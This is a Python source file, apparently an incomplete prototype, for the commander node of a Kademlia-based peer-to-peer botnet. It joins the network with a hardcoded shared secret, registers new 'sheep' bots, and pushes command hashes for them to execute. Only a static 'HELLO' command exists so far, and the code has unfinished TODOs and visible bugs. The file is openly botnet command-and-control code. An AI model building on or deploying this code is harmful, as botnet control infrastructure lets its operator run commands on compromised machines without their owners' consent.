"""
#### Asycn and Kademlia P2P Botnet
#### Commander is program which will start a kademlia server, bootstrap to the network, and listen for additional kademlia queries in the background
#### It will then create an interactive terminal in which the commander will pass commands which can be distributed via kademlia to the other bots in the network
#### Nodes will be organized into two types SHEEP = passive listeners which execute commands, and SHEPARDS = commander nodes which administer commands
"""

import asyncio, os, sys, logging, pdb, functools
from subprocess import check_call
from asyncio.tasks import ensure_future
import hashlib
import pprint as pp
from kademlia.network import Server
SECRET="TheSecretKey"

#Hashing function returns hexdigest
def get_hash(prehash):
    m = hashlib.sha1()
    m.update(prehash.encode('utf-8'))
    return m.hexdigest()


### Intialize logging 
handler = logging.StreamHandler()
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
log = logging.getLogger('kademlia')
log.addHandler(handler)
log.setLevel(logging.DEBUG) #DEBUG: Adjust to change log level

### Class which checks for existing networks, and will create its own key/val and join
class Shepard():
    # Key is hash of secret string
    def __init__(self, kserver, key):
        self._kserver = kserver
        self._key = key
        self._sheeps = {}
        self._count = 0
        #TODO: add looping call to check for new nodes
        #self.sheeploop = loop.call_later(8, functools.partial(self.checknewsheep())) )
    """
    Checks if new sheep are present otherwise returns false
    """
    #TODO: when a new sheep is added will update self.sheeps with {nodeID:cmdKey} 
    async def checknewsheep(self):
        async def addsheep(val): 
            if val:
                # new sheep found
                if val not in self._sheeps:
                    # Create new UUID for node stored on commander node
                    newval = get_hash(str(val))
                    self._sheeps[val] = newval
                    print("\nSetting Key:\nSheep NodeID: {}\nSheep CMD entry Key: {}\n".format(val, newval))
                    ## Set the NODEID 'val' of nearest neightbor to newval 'cmdkey of the bot'
                    result = await self._kserver.set(self._sheeps[val], str(val))
                    print("Added a new sheep")
                    pp.pprint(leader._sheeps)
                    await self.sheepGreeter()
                    return result
                return False    
        asyncio.sleep(5)
        #TODO: Implement Queue here so we can get multiple new nodes
        result = await self._kserver.get(self._key) #Should pull most recent entry added to network key ie command key of a nodeID 
        return await addsheep(result)
        
    """
    When new sheep joins the network, load sayHello program and execute
    """
    async def sheepGreeter(self):
        cmd="HELLO"
        #Iterate through sheeps list and send command to all sheep
        while await self.checknewsheep(): #Loop while this is true
            for key, val in self._sheeps.items():
                print("Starting HELLO for bot ID {}\nCMD_VALUE:{}".format(key,val))
                botcmdtorun = get_hash(cmd) #"HELLO" is currently static command -> sayHello.py
                await self._kserver.set(val,botcmdtorun)
                asyncio.sleep(5)
            if await self.checknewsheep():
                break

#TODO: Create Driver to allow person to manually admin commands
#TODO: Create function to check for new sheep, add them then perform CMD for all sheep in Dict self.sheeps. Need to derive a dict from server.get(). 
#TODO: Init waitHandler, which will set the programs default task to checking for new nodes and adding them to the network. 
if len(sys.argv) != 4:
    print("Usage: python commander.py <bootstrap node> <bootstrap port> <commander port>")
    sys.exit(1)

### SERVER STARTS HERE ###

### Initialize program loop
bootstrap_ip = str(sys.argv[1])
bootstrap_port = int(sys.argv[2])
myport = int(sys.argv[3])

### Initialize the Key which all nodes will join network with###
NETKEY = get_hash(SECRET)

loop=asyncio.get_event_loop()
loop.set_debug(True)

kserver = Server()
loop.run_until_complete(kserver.listen(myport))
loop.run_until_complete(kserver.bootstrap([(bootstrap_ip, bootstrap_port)]))

leader = Shepard(kserver, NETKEY)

try:
    loop_counter=0   
    while True:
        loop_counter+=1
        loop.run_until_complete(leader.checknewsheep())
        pp.pprint(vars(leader))
        if loop_counter > 10000: #kill before infinity happens 10000
            print("to many loop")
            break
    loop.run_forever()
except KeyboardInterrupt:
    pass
finally:
    kserver.stop()
    loop.close()